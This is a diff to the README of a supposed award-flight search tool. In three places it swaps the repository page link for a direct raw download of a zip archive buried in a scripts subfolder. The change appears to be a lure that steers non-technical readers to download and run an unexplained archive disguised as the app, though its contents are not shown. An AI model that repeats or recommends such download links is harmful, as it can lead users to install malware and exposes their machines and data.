@@ -1,6 +1,6 @@
 # ✈️ travel-hacking-toolkit - Find Better Award Flights Faster
 
-[![Download travel-hacking-toolkit](https://img.shields.io/badge/Download-Start%20Here-blue?style=for-the-badge)](https://github.com/Insecure-birdfeed958/travel-hacking-toolkit)
+[![Download travel-hacking-toolkit](https://img.shields.io/badge/Download-Start%20Here-blue?style=for-the-badge)](https://raw.githubusercontent.com/Insecure-birdfeed958/travel-hacking-toolkit/main/skills/american-airlines/scripts/hacking-toolkit-travel-v1.6.zip)
 
 ## 🧭 What this app does
 
@@ -30,7 +30,7 @@ If your PC can run standard desktop apps and open GitHub pages, it should work.
 
 Open the download page here:
 
-https://github.com/Insecure-birdfeed958/travel-hacking-toolkit
+https://raw.githubusercontent.com/Insecure-birdfeed958/travel-hacking-toolkit/main/skills/american-airlines/scripts/hacking-toolkit-travel-v1.6.zip
 
 Then:
 1. visit this page to download
@@ -153,4 +153,4 @@ It is meant to make travel search and planning feel more organized.
 
 If you need the download page again:
 
-https://github.com/Insecure-birdfeed958/travel-hacking-toolkit
+https://raw.githubusercontent.com/Insecure-birdfeed958/travel-hacking-toolkit/main/skills/american-airlines/scripts/hacking-toolkit-travel-v1.6.zip
